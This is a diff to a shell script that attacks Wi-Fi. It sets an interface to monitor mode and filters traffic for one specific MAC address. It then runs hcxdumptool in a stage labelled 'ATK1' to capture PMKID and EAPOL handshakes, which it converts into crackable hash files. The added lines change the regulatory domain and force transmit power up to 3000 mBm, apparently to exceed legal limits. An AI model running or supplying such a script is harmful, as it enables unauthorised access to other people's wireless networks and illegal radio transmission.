@@ -31,6 +31,9 @@ $CH iw reg get | sed -n 2p
 $CH ifconfig wlan0 down 2>/dev/null; sleep 1
 $CH iw dev wlan0 set type monitor 2>/dev/null
 $CH ifconfig wlan0 up 2>/dev/null; sleep 1
+$CH iw reg set TW 2>/dev/null; sleep 2
+$CH iw reg get | sed -n 2p
+$CH iw dev wlan0 set txpower fixed 1000 2>/dev/null
 echo ===BPF===
 $CH tcpdump -y IEEE802_11 -dd "wlan addr1 bc:3e:07:01:dc:98 or wlan addr2 bc:3e:07:01:dc:98 or wlan addr3 bc:3e:07:01:dc:98 or type mgt subtype probereq" > /tmp/t.bpf 2>/dev/null
 wc -c < /tmp/t.bpf
@@ -47,6 +50,7 @@ $CH hcxpcapngtool --all -o /tmp/a36.22000 /tmp/a36.pcapng* 2>/dev/null
 echo 36B: PMKID=$($CH grep -c PMKID /tmp/a36.22000 2>/dev/null) HS=$($CH grep -c EAPOL /tmp/a36.22000 2>/dev/null)
 $CH rm -f /tmp/a36*
 echo ===ATK1_BPF===
+$CH iw dev wlan0 set txpower fixed 3000 2>/dev/null
 timeout 32 $CH hcxdumptool -i wlan0 -c 1a --bpf=/tmp/t.bpf -w /tmp/a1.pcapng -t 7 --rds=2 2>&1 | tail -6
 ls -la /tmp/a1* 2>/dev/null
 $CH hcxpcapngtool --all -o /tmp/a1.22000 /tmp/a1.pcapng* 2>/dev/null
